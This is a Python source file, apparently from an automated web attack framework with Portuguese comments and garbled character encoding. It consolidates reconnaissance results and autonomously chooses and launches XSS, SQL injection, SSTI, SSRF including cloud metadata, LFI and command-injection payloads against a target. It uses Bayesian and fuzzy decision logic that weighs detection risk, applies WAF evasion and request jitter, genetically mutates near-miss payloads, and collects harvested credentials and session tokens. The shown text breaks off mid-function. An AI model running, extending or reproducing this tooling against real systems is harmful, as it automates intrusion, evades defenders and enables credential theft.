"""
MSE Motor 11  Autonomous Consolidator Engine
===================================================
NÃƒO SUBSTITUI NADA. Consome dados brutos de TODOS os motores (1-10),
consolida findings/probes/dumps, aplica dicionÃ¡rio brutal com decisÃ£o
Bayesiana + mutaÃ§Ã£o genÃ©tica para execuÃ§Ã£o autÃ´noma de ataques.

Fases:
  1. INGEST     Coleta resultados brutos de todos os motores
  2. CORRELATE  Cruza dados, identifica vetores de alto valor
  3. SELECT     Seleciona payloads via Bayesian + contexto
  4. EXECUTE    ExecuÃ§Ã£o autÃ´noma (Selenium para XSS, httpx para REST)
  5. EVOLVE     MutaÃ§Ã£o genÃ©tica dos payloads que quase funcionaram
  6. REPORT     Emite relatÃ³rio consolidado em tempo real

Emite eventos via stdout JSON para consumo pelo server/admin.ts
"""

import asyncio
import hashlib
import json
import re
import sys
import time
import uuid
import os
import math
import random
from typing import List, Dict, Any, Optional, Callable
from urllib.parse import urlparse, urljoin, urlencode, parse_qs

from scanner.payload_dictionary import PayloadDictionary, WAF_EVASION_PROFILES
from scanner.bayesian_decision import BayesianDecisionEngine
from scanner.genetic_payload import GeneticPayloadEngine, PayloadOrganism


def m11_emit(event_type: str, data: Any):
    msg = json.dumps({"type": "MOTOR11", "event": event_type, "data": data, "ts": time.time()})
    print(msg, flush=True)


def m11_log(message: str, level: str = "info", phase: str = "motor11"):
    m11_emit("reasoning_log", {
        "message": message,
        "level": level,
        "phase": phase,
        "timestamp": time.strftime("%H:%M:%S"),
    })


AUTONOMOUS_XSS_VECTORS = [
    "xss_reflected", "xss_dom", "xss_stored", "xss_template_angular",
    "xss_template_vue", "xss_dangerously", "xss_jquery_dom", "xss_csti",
    "xss_polyglot", "xss_waf_bypass",
]

AUTONOMOUS_INJECTION_VECTORS = [
    "sqli_raw", "sqli_blind", "sqli_union", "sqli_error",
    "ssti_jinja", "ssti_ejs", "ssti_thymeleaf",
    "nosql_injection", "command_injection",
]

AUTONOMOUS_INFRA_VECTORS = [
    "ssrf", "ssrf_metadata", "lfi", "path_traversal",
    "open_redirect", "xxe", "prototype_pollution",
    "auth_bypass", "idor", "cors_exploit",
    "jwt_attack", "header_injection", "http_smuggling",
]


class MLPayloadSelector:
    """
    Seleciona payloads baseado em aprendizado de sucessos anteriores.
    Abordagem bandit contextual simples com decaimento temporal.
    """

    def __init__(self, decay_factor: float = 0.95):
        self.success_matrix: Dict[str, Dict[str, float]] = {}  # key -> {success,total,last_seen}
        self.decay_factor = decay_factor
        self.total_predictions = 0
        self.correct_predictions = 0

    def _ctx_key(self, context: Dict) -> str:
        waf = context.get("waf_type", "unknown")
        stack = tuple(sorted(context.get("tech_stack", [])))
        stealth = context.get("stealth_level", "medium")
        return f"{waf}|{stack}|{stealth}"

    def _similarity(self, ctx1: str, ctx2: str) -> float:
        parts1 = ctx1.split("|")
        parts2 = ctx2.split("|")
        if len(parts1) != 3 or len(parts2) != 3:
            return 0.0

        waf_sim = 1.0 if parts1[0] == parts2[0] else 0.0

        stack1 = set(parts1[1].strip("()").split(", ")) if parts1[1] != "()" else set()
        stack2 = set(parts2[1].strip("()").split(", ")) if parts2[1] != "()" else set()
        if stack1 and stack2:
            inter = stack1 & stack2
            union = stack1 | stack2
            stack_sim = len(inter) / len(union) if union else 0.0
        else:
            stack_sim = 1.0 if not stack1 and not stack2 else 0.0

        stealth_sim = 1.0 if parts1[2] == parts2[2] else 0.0

        return waf_sim * 0.4 + stack_sim * 0.4 + stealth_sim * 0.2

    def update_from_execution(self, results: List[Dict], context: Dict):
        ctx_key = self._ctx_key(context)

        for r in results:
            if not r.get("payload_id"):
                continue
            pid = r.get("payload_id")
            vector = r.get("vector", "unknown")
            key = f"{ctx_key}|{vector}|{pid}"

            entry = self.success_matrix.get(key, {"success": 0.0, "total": 0.0, "last_seen": time.time()})
            if r.get("success"):
                entry["success"] = entry["success"] * self.decay_factor + 1.0
                self.correct_predictions += 1
            else:
                entry["success"] = entry["success"] * self.decay_factor
            entry["total"] = entry["total"] + 1.0
            entry["last_seen"] = time.time()
            self.success_matrix[key] = entry
            self.total_predictions += 1

    def predict_success_prob(self, payload: Dict, context: Dict) -> float:
        ctx_key = self._ctx_key(context)
        vector = payload.get("category", "unknown")
        pid = payload.get("id", "unknown")
        exact_key = f"{ctx_key}|{vector}|{pid}"

        if exact_key in self.success_matrix:
            data = self.success_matrix[exact_key]
            return (data["success"] + 1.0) / (data["total"] + 2.0)

        # Contextos similares
        similar_probs = []
        weights = []
        now = time.time()
        for key, data in self.success_matrix.items():
            try:
                k_ctx, k_vec, k_pid = key.split("|", 2)
            except ValueError:
                continue
            if k_vec != vector or k_pid != pid:
                continue
            sim = self._similarity(ctx_key, k_ctx)
            if sim < 0.3:
                continue
            recency = math.exp(-(now - data.get("last_seen", now)) / 86400)
            weight = sim * recency
            prob = (data["success"] + 1.0) / (data["total"] + 2.0)
            similar_probs.append(prob)
            weights.append(weight)

        if similar_probs and sum(weights) > 0:
            return sum(p * w for p, w in zip(similar_probs, weights)) / sum(weights)

        return payload.get("adjusted_weight", payload.get("base_weight", 0.5))

    def get_top_payloads(self, candidates: List[Dict], context: Dict, limit: int = 10) -> List[Dict]:
        for p in candidates:
            p["ml_probability"] = self.predict_success_prob(p, context)
            p["combined_score"] = (
                p.get("adjusted_weight", p.get("base_weight", 0.5)) * 0.3 +
                p["ml_probability"] * 0.7
            )
        sorted_candidates = sorted(candidates, key=lambda x: x.get("combined_score", 0), reverse=True)
        return sorted_candidates[:limit]

    def get_stats(self) -> Dict[str, Any]:
        unique_contexts = set()
        unique_payloads = set()
        for key in self.success_matrix.keys():
            try:
                ctx, vector, pid = key.split("|", 2)
                unique_contexts.add(ctx)
                unique_payloads.add(pid)
            except ValueError:
                continue

        accuracy = self.correct_predictions / max(1, self.total_predictions)
        return {
            "total_predictions": self.total_predictions,
            "accuracy": accuracy,
            "unique_contexts": len(unique_contexts),
            "unique_payloads": len(unique_payloads),
            "total_experience": sum(int(v["total"]) for v in self.success_matrix.values()),
        }


class MonteCarloSimulator:
    """Simula cenÃƒÂ¡rios para estimar probabilidade real de sucesso."""

    def __init__(self, simulations: int = 300):
        self.simulations = simulations
        self.cache: Dict[str, Dict[str, Any]] = {}

    def _percentile(self, data: List[float], percentile: int) -> float:
        if not data:
            return 0.0
        data = sorted(data)
        k = (len(data) - 1) * percentile / 100
        f = math.floor(k)
        c = math.ceil(k)
        if f == c:
            return data[int(k)]
        d0 = data[int(f)] * (c - k)
        d1 = data[int(c)] * (k - f)
        return d0 + d1

    def simulate(self, action: Dict, context: Dict) -> Dict:
        cache_key = f"{action.get('id','unknown')}|{context.get('waf_type','unknown')}"
        if cache_key in self.cache and time.time() - self.cache[cache_key]["timestamp"] < 300:
            return self.cache[cache_key]["result"]

        successes = 0
        success_probs: List[float] = []

        waf_bypass_prob = action.get("waf_bypass_prob", 0.5)
        base_prob = action.get("base_weight", 0.5)
        detection_rate = context.get("detection_rate", 0.3) or 0.3
        tech_match = 1.2 if action.get("vector") in context.get("stack_vectors", []) else 0.8

        for _ in range(self.simulations):
            waf_bypass = random.betavariate(2, 2) < waf_bypass_prob
            detection = random.expovariate(1 / detection_rate) < 0.1
            payload_fitness = max(0.0, min(1.0, base_prob + random.gauss(0, 0.15)))

            success_prob = (
                (0.35 if waf_bypass else 0) +
                (0.25 if not detection else 0) +
                (payload_fitness * 0.25) +
                (tech_match * 0.15)
            )
            success = random.random() < success_prob
            success_probs.append(success_prob)
            if success:
                successes += 1

        success_rate = successes / self.simulations
        z = 1.96
        ci_margin = z * math.sqrt((success_rate * (1 - success_rate)) / max(1, self.simulations))

        result = {
            "action": action.get("name", action.get("vector", "unknown")),
            "success_probability": success_rate,
            "confidence_interval": (
                max(0.0, success_rate - ci_margin),
                min(1.0, success_rate + ci_margin)
            ),
            "simulations": self.simulations,
            "outcome_distribution": {"success": successes, "failure": self.simulations - successes},
            "percentiles": {
                "p10": self._percentile(success_probs, 10),
                "p50": self._percentile(success_probs, 50),
                "p90": self._percentile(success_probs, 90),
            },
        }

        try:
            m11_emit("monte_carlo", {
                "current": successes,
                "total": self.simulations,
                "bestPath": action.get("vector", "unknown"),
                "success_probability": success_rate,
            })
        except Exception:
            pass

        self.cache[cache_key] = {"timestamp": time.time(), "result": result}
        return result


class FuzzyDecisionEngine:
    """Tomada de decisÃƒÂ£o baseada em lÃƒÂ³gica fuzzy para risco/recompensa."""

    def __init__(self):
        self.prob_sets = {
            "very_low": (0.0, 0.15, 0.25),
            "low": (0.2, 0.35, 0.45),
            "medium": (0.4, 0.55, 0.65),
            "high": (0.6, 0.75, 0.85),
            "very_high": (0.8, 0.9, 1.0),
        }
        self.value_sets = {
            "low_value": (0, 30, 50),
            "medium_value": (40, 100, 150),
            "high_value": (120, 300, 500),
            "critical_value": (400, 1000, 2000),
        }
        self.risk_sets = {
            "low_risk": (0.0, 0.2, 0.3),
            "medium_risk": (0.25, 0.5, 0.6),
            "high_risk": (0.55, 0.8, 1.0),
        }
        self.rules = [
            {"if": {"prob": "very_high", "value": "critical_value", "risk": "low_risk"}, "then": "EXECUTE_IMMEDIATE", "weight": 1.0},
            {"if": {"prob": "very_high", "value": "high_value", "risk": "low_risk"}, "then": "EXECUTE_IMMEDIATE", "weight": 0.9},
            {"if": {"prob": "high", "value": "critical_value", "risk": "low_risk"}, "then": "EXECUTE_IMMEDIATE", "weight": 0.85},
            {"if": {"prob": "high", "value": "high_value", "risk": "medium_risk"}, "then": "EXECUTE", "weight": 0.9},
            {"if": {"prob": "medium", "value": "critical_value", "risk": "low_risk"}, "then": "EXECUTE", "weight": 0.85},
            {"if": {"prob": "very_high", "value": "medium_value", "risk": "medium_risk"}, "then": "EXECUTE", "weight": 0.8},
            {"if": {"prob": "medium", "value": "medium_value", "risk": "medium_risk"}, "then": "CONSIDER", "weight": 0.8},
            {"if": {"prob": "high", "value": "low_value", "risk": "high_risk"}, "then": "CONSIDER", "weight": 0.7},
            {"if": {"prob": "low", "value": "high_value", "risk": "low_risk"}, "then": "CONSIDER", "weight": 0.75},
            {"if": {"prob": "low", "value": "medium_value", "risk": "medium_risk"}, "then": "DEFER", "weight": 0.8},
            {"if": {"prob": "medium", "value": "low_value", "risk": "high_risk"}, "then": "DEFER", "weight": 0.75},
            {"if": {"prob": "very_low", "risk": "high_risk"}, "then": "SKIP", "weight": 1.0},
            {"if": {"prob": "low", "value": "low_value", "risk": "high_risk"}, "then": "SKIP", "weight": 0.9},
        ]

    def _fuzzify(self, value: float, sets: Dict[str, tuple]) -> Dict[str, float]:
        membership: Dict[str, float] = {}
        for name, (a, b, c) in sets.items():
            if value <= a:
                membership[name] = 0.0
            elif a < value <= b:
                membership[name] = (value - a) / (b - a)
            elif b < value < c:
                membership[name] = (c - value) / (c - b)
            else:
                membership[name] = 0.0
        return membership

    def _evaluate_rule(self, rule: Dict, prob_m: Dict, val_m: Dict, risk_m: Dict) -> float:
        cond = rule.get("if", {})
        prob_d = prob_m.get(cond.get("prob", ""), 0.0)
        val_d = val_m.get(cond.get("value", ""), 1.0)
        risk_d = risk_m.get(cond.get("risk", ""), 1.0)
        return prob_d * val_d * risk_d * rule.get("weight", 1.0)

    def decide(self, prob: float, data_value: float, detection_risk: float) -> Dict:
        prob_m = self._fuzzify(prob, self.prob_sets)
        val_m = self._fuzzify(data_value, self.value_sets)
        risk_m = self._fuzzify(detection_risk, self.risk_sets)

        decisions: Dict[str, float] = {}
        for rule in self.rules:
            activation = self._evaluate_rule(rule, prob_m, val_m, risk_m)
            if activation > 0:
                decision = rule["then"]
                decisions[decision] = max(decisions.get(decision, 0.0), activation)

        if not decisions:
            if prob > 0.6:
                decisions["EXECUTE"] = 0.5
            elif prob > 0.3:
                decisions["CONSIDER"] = 0.5
            else:
                decisions["DEFER"] = 0.5

        final = max(decisions.items(), key=lambda x: x[1])
        return {
            "decision": final[0],
            "confidence": final[1],
            "fuzzy_membership": {"prob": prob_m, "value": val_m, "risk": risk_m},
            "all_decisions": decisions,
            "inputs": {"prob": prob, "data_value": data_value, "detection_risk": detection_risk},
        }


class AutonomousConsolidator:

    CANARY_PREFIX = "MSE_M11_"

    def __init__(self, target: str, log_fn: Optional[Callable] = None, emit_fn: Optional[Callable] = None):
        self.target = target
        self.parsed = urlparse(target)
        self.log = log_fn or m11_log
        self.emit = emit_fn or m11_emit

        self.dictionary = PayloadDictionary()
        self.bayesian = BayesianDecisionEngine()
        self.genetic = GeneticPayloadEngine()

        self.consolidated_intel: Dict[str, Any] = {
            "tech_stack": [],
            "waf_type": "unknown",
            "waf_strength": "unknown",
            "block_rate": 0.0,
            "confirmed_xss": [],
            "confirmed_sqli": [],
            "confirmed_ssrf": [],
            "confirmed_other": [],
            "all_findings": [],
            "all_probes": [],
            "endpoints": [],
            "parameters": [],
            "forms": [],
            "js_sinks": [],
            "cookies": [],
            "credentials": [],
            "session_tokens": [],
            "dom_sinks": [],
            "frameworks_detected": [],
            "source_maps": [],
            "incident_evidence": {},
            "kill_chain_nodes": [],
            "ghost_recon": {},
            "hrd_playbooks": [],
            "risk_score": 0.0,
            "auto_dump_triggered": False,
            "chain_intel": {},
            "sniper_decision": {},
            "genetic_report": {},
        }

        self.execution_results: List[Dict] = []
        self.reasoning_trace: List[Dict] = []
        self.cycles_completed = 0
        self.max_cycles = 3
        self.started_at = time.time()

    def ingest_pipeline_data(self,
                             findings: List = None,
                             probes: List = None,
                             hypothesis: Dict = None,
                             ghost_recon: Dict = None,
                             decision_intel: Dict = None,
                             adversarial_report: Dict = None,
                             chain_intel: Dict = None,
                             hacker_reasoning: Dict = None,
                             incident_evidence: Dict = None,
                             risk_score: float = 0.0,
                             auto_dump_triggered: bool = False,
                             sniper_decision: Dict = None,
                             enterprise_dossier: Dict = None,
                             persistence_assessment: Dict = None):

        self.log("[MOTOR 11] â˜… PHASE 1: INGEST  Consumindo dados brutos de TODOS os motores...", "error", "ingest")

        if findings:
            self.consolidated_intel["all_findings"] = list(findings)
            self._classify_findings(findings)
            self.log(f"  â”œâ”€ {len(findings)} findings ingeridos", "info", "ingest")

        if probes:
            self.consolidated_intel["all_probes"] = list(probes)
            self._extract_probe_intel(probes)
            self.log(f"  â”œâ”€ {len(probes)} probes ingeridos", "info", "ingest")

        if hypothesis:
            stacks = hypothesis.get("detected_stacks", [])
            if stacks:
                self.consolidated_intel["tech_stack"] = stacks
            waf = hypothesis.get("waf_vendor", "")
            if waf:
                self.consolidated_intel["waf_type"] = waf
            self.consolidated_intel["waf_strength"] = hypothesis.get("waf_strength", "unknown")

        if ghost_recon:
            self.consolidated_intel["ghost_recon"] = ghost_recon
            endpoints = ghost_recon.get("forgotten_paths", [])
            subdomains = ghost_recon.get("subdomains", [])
            self.consolidated_intel["endpoints"].extend(endpoints)
            if subdomains:
                self.log(f"  â”œâ”€ Ghost Recon: {len(subdomains)} subdomains, {len(endpoints)} forgotten paths", "warn", "ingest")

        if decision_intel:
            tree_report = decision_intel.get("tree_report", {})
            vuln_classes = tree_report.get("vulnerability_classes_detected", [])
            if vuln_classes:
                self.log(f"  â”œâ”€ Decision Intel: {len(vuln_classes)} vuln classes detectadas", "warn", "ingest")

        if adversarial_report:
            state_transitions = adversarial_report.get("state_transitions", [])
            if state_transitions:
                self.log(f"  â”œâ”€ Adversarial: {len(state_transitions)} state transitions", "info", "ingest")

        if chain_intel:
            self.consolidated_intel["chain_intel"] = chain_intel
            chains = chain_intel.get("chains_discovered", [])
            if chains:
                self.log(f"  â”œâ”€ Chain Intel: {len(chains)} exploitation chains", "warn", "ingest")

        if hacker_reasoning:
            env = hacker_reasoning.get("environment", {})
            if env.get("waf_detected"):
                self.consolidated_intel["waf_type"] = env.get("waf_vendor", "unknown")
                waf_def = hacker_reasoning.get("waf_defensibility", {})
                br = waf_def.get("block_rate", 0.5)
                self.consolidated_intel["block_rate"] = br
                if br > 0.7:
                    self.consolidated_intel["waf_strength"] = "strong"
                elif br > 0.3:
                    self.consolidated_intel["waf_strength"] = "medium"
                else:
                    self.consolidated_intel["waf_strength"] = "weak"

            playbooks = hacker_reasoning.get("executed_playbooks", [])
            self.consolidated_intel["hrd_playbooks"] = playbooks
            if playbooks:
                self.log(f"  â”œâ”€ HRD: {len(playbooks)} playbooks executados", "info", "ingest")

        if incident_evidence:
            self.consolidated_intel["incident_evidence"] = incident_evidence
            ev_count = len(incident_evidence.get("evidence_table", []))
            if ev_count:
                self.log(f"  â”œâ”€ Incident Absorber: {ev_count} evidÃªncias", "error", "ingest")

        self.consolidated_intel["risk_score"] = risk_score
        self.consolidated_intel["auto_dump_triggered"] = auto_dump_triggered

        if sniper_decision:
            self.consolidated_intel["sniper_decision"] = sniper_decision
            bayesian_report = sniper_decision.get("bayesian_inference", {})
            if bayesian_report:
                for entry in bayesian_report.get("top_attack_targets", []):
                    vec = entry.get("vector", "")
                    prob = entry.get("probability", 0)
                    if prob > 0.5:
                        self.bayesian.update_prior(vec, True)

        if enterprise_dossier:
            creds = enterprise_dossier.get("deep_credential_extractions", [])
            tokens = enterprise_dossier.get("session_tokens", [])
            self.consolidated_intel["credentials"].extend(creds)
            self.consolidated_intel["session_tokens"].extend(tokens)
            if creds or tokens:
                self.log(f"  â”œâ”€ Dossier: {len(creds)} credentials, {len(tokens)} session tokens", "error", "ingest")

        self.emit("motor11_ingest_complete", {
            "findings": len(self.consolidated_intel["all_findings"]),
            "probes": len(self.consolidated_intel["all_probes"]),
            "tech_stack": self.consolidated_intel["tech_stack"],
            "waf_type": self.consolidated_intel["waf_type"],
            "waf_strength": self.consolidated_intel["waf_strength"],
            "confirmed_xss": len(self.consolidated_intel["confirmed_xss"]),
            "confirmed_sqli": len(self.consolidated_intel["confirmed_sqli"]),
            "confirmed_ssrf": len(self.consolidated_intel["confirmed_ssrf"]),
            "risk_score": risk_score,
            "auto_dump": auto_dump_triggered,
        })

        self.log(f"  â””â”€ INGEST COMPLETO  Risk Score: {risk_score:.2f}, Tech: {self.consolidated_intel['tech_stack']}", "error", "ingest")

    def _classify_findings(self, findings: List):
        for f in findings:
            if isinstance(f, dict):
                title = (f.get("title", "") + " " + f.get("type", "")).lower()
                severity = f.get("severity", "").lower()
                if "xss" in title:
                    self.consolidated_intel["confirmed_xss"].append(f)
                elif "sql" in title or "sqli" in title:
                    self.consolidated_intel["confirmed_sqli"].append(f)
                elif "ssrf" in title:
                    self.consolidated_intel["confirmed_ssrf"].append(f)
                elif severity in ("critical", "high"):
                    self.consolidated_intel["confirmed_other"].append(f)

                evidence = f.get("evidence", "") or ""
                if "innerhtml" in evidence.lower() or "eval(" in evidence.lower():
                    self.consolidated_intel["js_sinks"].append(f)
                if "sourcemap" in evidence.lower() or ".map" in evidence.lower():
                    self.consolidated_intel["source_maps"].append(evidence)
            elif hasattr(f, "title"):
                title = (getattr(f, "title", "") or "").lower()
                severity = (getattr(f, "severity", "") or "").lower()
                if "xss" in title:
                    self.consolidated_intel["confirmed_xss"].append({"title": getattr(f, "title", ""), "severity": severity})

    def _extract_probe_intel(self, probes: List):
        for p in probes:
            if not isinstance(p, dict):
                continue
            url = p.get("url", "") or p.get("target_url", "")
            if url:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                if params:
                    for param_name in params:
                        if param_name not in self.consolidated_intel["parameters"]:
                            self.consolidated_intel["parameters"].append(param_name)

            resp_headers = p.get("response_headers", {})
            if isinstance(resp_headers, dict):
                cookies_header = resp_headers.get("set-cookie", "")
                if cookies_header:
                    self.consolidated_intel["cookies"].append(cookies_header)

    async def correlate(self) -> Dict:
        self.log("[MOTOR 11] â˜… PHASE 2: CORRELATE  Cruzando dados de todos os motores...", "error", "correlate")

        intel = self.consolidated_intel
        context = {
            "stack_vectors": [],
            "waf_strength": intel["waf_strength"],
            "findings": intel["all_findings"],
            "auto_dump_triggered": intel["auto_dump_triggered"],
        }

        for stack in intel["tech_stack"]:
            stack_lower = stack.lower()
            from scanner.payload_dictionary import TECH_CONTEXT_MATRIX
            for tech_key, vectors in TECH_CONTEXT_MATRIX.items():
                if tech_key in stack_lower or stack_lower in tech_key:
                    context["stack_vectors"].extend(vectors)

        all_vectors = set()
        all_vectors.update(AUTONOMOUS_XSS_VECTORS)
        all_vectors.update(AUTONOMOUS_INJECTION_VECTORS)
        all_vectors.update(AUTONOMOUS_INFRA_VECTORS)

        bayesian_xss = [
            "xss_reflected", "xss_dom", "xss_template",
            "xss_stored", "xss_polyglot", "xss_waf_bypass",
        ]
        for v in bayesian_xss:
            if v not in self.bayesian.priors:
                if v == "xss_reflected":
                    self.bayesian.priors[v] = 0.50
                elif v == "xss_dom":
                    self.bayesian.priors[v] = 0.40
                elif v == "xss_template":
                    self.bayesian.priors[v] = 0.35
                elif v == "xss_stored":
                    self.bayesian.priors[v] = 0.25
                elif v == "xss_polyglot":
                    self.bayesian.priors[v] = 0.45
                elif v == "xss_waf_bypass":
                    self.bayesian.priors[v] = 0.40

        if intel["confirmed_xss"]:
            for v in bayesian_xss:
                self.bayesian.update_prior(v, True)
            self.log(f"  â”œâ”€ {len(intel['confirmed_xss'])} XSS confirmados â†’ priors BOOSTED", "warn", "correlate")

        if intel["js_sinks"]:
            self.bayesian.update_prior("xss_dom", True)
            self.bayesian.update_prior("xss_dom", True)
            self.log(f"  â”œâ”€ {len(intel['js_sinks'])} DOM sinks â†’ xss_dom prior BOOSTED x2", "warn", "correlate")

        if intel["confirmed_sqli"]:
            for sq_v in ["sqli_raw", "sqli_blind", "sqli_union", "sqli_error"]:
                if sq_v not in self.bayesian.priors:
                    self.bayesian.priors[sq_v] = 0.45
                self.bayesian.update_prior(sq_v, True)
            self.log(f"  â”œâ”€ {len(intel['confirmed_sqli'])} SQLi confirmados â†’ priors BOOSTED", "warn", "correlate")

        if intel["confirmed_ssrf"]:
            self.bayesian.update_prior("ssrf", True)
            self.bayesian.update_prior("ssrf_metadata", True)

        eval_vectors = list(set(context["stack_vectors"]))
        if not eval_vectors:
            eval_vectors = ["xss_reflected", "xss_dom", "sqli_raw", "ssrf", "ssti_jinja", "lfi", "nosql_injection"]

        bayesian_results = self.bayesian.batch_evaluate(eval_vectors, context)

        attack_targets = [r for r in bayesian_results if r["decision"] == "ATTACK"]
        defer_targets = [r for r in bayesian_results if r["decision"] == "DEFER"]
        skip_targets = [r for r in bayesian_results if r["decision"] == "SKIP"]

        try:
            prob_map = {
                "ssrf": next((r["probability"] for r in bayesian_results if r["attack_vector"] == "ssrf"), 0.0),
                "lfi": next((r["probability"] for r in bayesian_results if r["attack_vector"] == "lfi"), 0.0),
                "sqli": next((r["probability"] for r in bayesian_results if r["attack_vector"].startswith("sqli")), 0.0),
                "xss": next((r["probability"] for r in bayesian_results if r["attack_vector"].startswith("xss")), 0.0),
                "cloud_hijack": next((r["probability"] for r in bayesian_results if r["attack_vector"] == "ssrf_metadata"), 0.0),
            }
            m11_emit("probability_update", {"probabilities": prob_map, "target": self.target, "timestamp": time.time()})
        except Exception:
            pass

        self.log(f"  â”œâ”€ Bayesian: {len(attack_targets)} ATTACK, {len(defer_targets)} DEFER, {len(skip_targets)} SKIP", "error", "correlate")

        for at in attack_targets:
            self._add_reasoning(
                f"ATTACK: {at['attack_vector']}  P(success)={at['probability']:.3f} "
                f"[prior={at['prior']:.3f}, likelihood={at['likelihood']:.3f}]",
                "attack_decision"
            )

        page_context = list(set(
            intel["parameters"] +
            [f.lower() for f in intel["frameworks_detected"]] +
            (["input", "url_param"] if intel["parameters"] else ["url_param"])
        ))

        selected_payloads = self.dictionary.get_top_payloads(
            tech_stack=intel["tech_stack"],
            page_context=page_context,
            waf_type=intel["waf_type"],
            waf_strength=intel["waf_strength"],
            findings=[f for f in intel["all_findings"] if isinstance(f, dict)],
            limit=40,
        )

        self.log(f"  â”œâ”€ Dictionary: {len(selected_payloads)} payloads selecionados (de {self.dictionary.get_total_count()} total)", "warn", "correlate")
        self.log(f"  â””â”€ CORRELATE COMPLETO", "error", "correlate")

        correlation_report = {
            "bayesian_results": bayesian_results,
            "attack_targets": attack_targets,
            "defer_targets": defer_targets,
            "skip_targets": skip_targets,
            "selected_payloads_count": len(selected_payloads),
            "page_context": page_context,
            "reasoning_trace": list(self.reasoning_trace),
        }

        self.emit("motor11_correlate_complete", correlation_report)
        return {
            "attack_targets": attack_targets,
            "selected_payloads": selected_payloads,
            "page_context": page_context,
            "bayesian_results": bayesian_results,
        }

    async def execute_autonomous(self, correlation: Dict) -> List[Dict]:
        self.log("[MOTOR 11] â˜… PHASE 3: EXECUTE  ExecuÃ§Ã£o autÃ´noma guiada por probabilidade...", "error", "execute")

        attack_targets = correlation.get("attack_targets", [])
        m11_emit("autonomous_thought", {
            "timestamp": time.time(),
            "thought": f"[AUTONOMO] Analisando alvo: {self.target}",
        })

        selected_payloads = correlation.get("selected_payloads", [])

        if not selected_payloads:
            self.log("  â””â”€ Nenhum payload selecionado. Abortando execuÃ§Ã£o.", "warn", "execute")
            return []

        timing = self._calculate_timing()
        self.log(
            f"  â”œâ”€ Timing profile: {timing['delay']}s delay, {timing['max_rpm']} req/min, jitter={'ON' if timing['jitter'] else 'OFF'}",
            "info", "execute"
        )

        xss_payloads = [p for p in selected_payloads if "xss" in p["category"]]
        injection_payloads = [p for p in selected_payloads if p["category"] in ("sqli_raw", "sqli_blind", "sqli_union", "sqli_error", "ssti_jinja", "ssti_ejs", "ssti_thymeleaf", "nosql_injection", "command_injection")]
        infra_payloads = [p for p in selected_payloads if p["category"] in ("ssrf", "ssrf_metadata", "lfi", "path_traversal", "open_redirect", "xxe", "prototype_pollution", "auth_bypass", "idor")]

        results = []

        if xss_payloads:
            self.log(f"  â”œâ”€ XSS PHASE: {len(xss_payloads)} payloads para teste browser-based...", "error", "execute")
            xss_results = await self._execute_xss_payloads(xss_payloads[:20], timing)
            results.extend(xss_results)

            success = [r for r in xss_results if r.get("success")]
            partial = [r for r in xss_results if r.get("reflected") and not r.get("success")]
            blocked = [r for r in xss_results if r.get("blocked")]

            self.log(
                f"  â”‚  â””â”€ XSS: {len(success)} confirmed, {len(partial)} reflected, {len(blocked)} blocked",
                "error" if success else "warn", "execute"
            )

            for s in success:
                self.bayesian.update_prior(s.get("vector", "xss"), True)
                self.dictionary.update_weight(s.get("payload_id", ""), True)
            for f in blocked:
                self.bayesian.update_prior(f.get("vector", "xss"), False)
                self.dictionary.update_weight(f.get("payload_id", ""), False)

            if partial and self.cycles_completed < self.max_cycles:
                self.log(f"  â”‚  â”œâ”€ {len(partial)} payloads reflected â†’ feeding Genetic Engine for mutation...", "warn", "execute")
                mutated = self._evolve_partial_payloads(partial)
                if mutated:
                    self.log(f"  â”‚  â””â”€ {len(mutated)} mutants generated for cycle {self.cycles_completed + 1}", "warn", "execute")
                    mutated_results = await self._execute_xss_payloads(mutated[:10], timing)
                    results.extend(mutated_results)
                    mut_success = [r for r in mutated_results if r.get("success")]
                    if mut_success:
                        self.log(f"  â”‚     â””â”€ GENETIC MUTATION SUCCESS: {len(mut_success)} XSS confirmed via evolved payloads!", "error", "execute")

        if injection_payloads:
            self.log(f"  â”œâ”€ INJECTION PHASE: {len(injection_payloads)} payloads para teste HTTP...", "warn", "execute")
            inj_results = await self._execute_http_payloads(injection_payloads[:15], timing)
            results.extend(inj_results)

            inj_success = [r for r in inj_results if r.get("success")]
            if inj_success:
                self.log(f"  â”‚  â””â”€ INJECTION: {len(inj_success)} confirmed!", "error", "execute")
                for s in inj_success:
                    self.bayesian.update_prior(s.get("vector", "sqli"), True)
                    self.dictionary.update_weight(s.get("payload_id", ""), True)

        if infra_payloads:
            self.log(f"  â”œâ”€ INFRA PHASE: {len(infra_payloads)} payloads para teste infra...", "warn", "execute")
            infra_results = await self._execute_http_payloads(infra_payloads[:10], timing)
            results.extend(infra_results)

            infra_success = [r for r in infra_results if r.get("success")]
            if infra_success:
                self.log(f"  â”‚  â””â”€ INFRA: {len(infra_success)} confirmed!", "error", "execute")

        self.execution_results = results
        self.cycles_completed += 1

        self.emit("motor11_execute_complete", {
            "total_tests": len(results),
            "successes": len([r for r in results if r.get("success")]),
            "reflected": len([r for r in results if r.get("reflected")]),
            "blocked": len([r for r in results if r.get("blocked")]),
            "cycle": self.cycles_completed,
        })

        self.log(f"  â””â”€ EXECUTE COMPLETO  Ciclo {self.cycles_completed}/{self.max_cycles}", "error", "execute")
        return results

    async def execute_autonomous_v2(self, correlation: Dict) -> List[Dict]:
        """VersÃ£o SNIPER com seleÃ§Ã£o adaptativa, Monte Carlo e lÃ³gica fuzzy."""
        self.log("[MOTOR 11-SNIPER] â˜… PHASE 3: EXECUTE  ML + Monte Carlo + Fuzzy", "error", "execute")

        selected_payloads = correlation.get("selected_payloads", [])
        if not selected_payloads:
            self.log("  â””â”€ Nenhum payload selecionado. Abortando execuÃ§Ã£o.", "warn", "execute")
            return []

        context = {
            "waf_type": self.consolidated_intel.get("waf_type", "unknown"),
            "tech_stack": self.consolidated_intel.get("tech_stack", []),
            "stealth_level": self.consolidated_intel.get("waf_strength", "medium"),
            "detection_rate": self.consolidated_intel.get("block_rate", 0.3),
            "stack_vectors": self.consolidated_intel.get("frameworks_detected", []),
        }

        if not hasattr(self, "ml_selector"):
            self.ml_selector = MLPayloadSelector()
        mc_simulator = MonteCarloSimulator(simulations=300)
        fuzzy_engine = FuzzyDecisionEngine()

        top_payloads = self.ml_selector.get_top_payloads(selected_payloads, context, limit=40)

        timing = self._calculate_timing()
        self.log(
            f"  â”œâ”€ Timing: {timing['delay']}s, {timing['max_rpm']} rpm, jitter={'ON' if timing['jitter'] else 'OFF'} | ML payloads={len(top_payloads)}",
            "info", "execute"
        )

        xss_payloads = [p for p in top_payloads if "xss" in p["category"]]
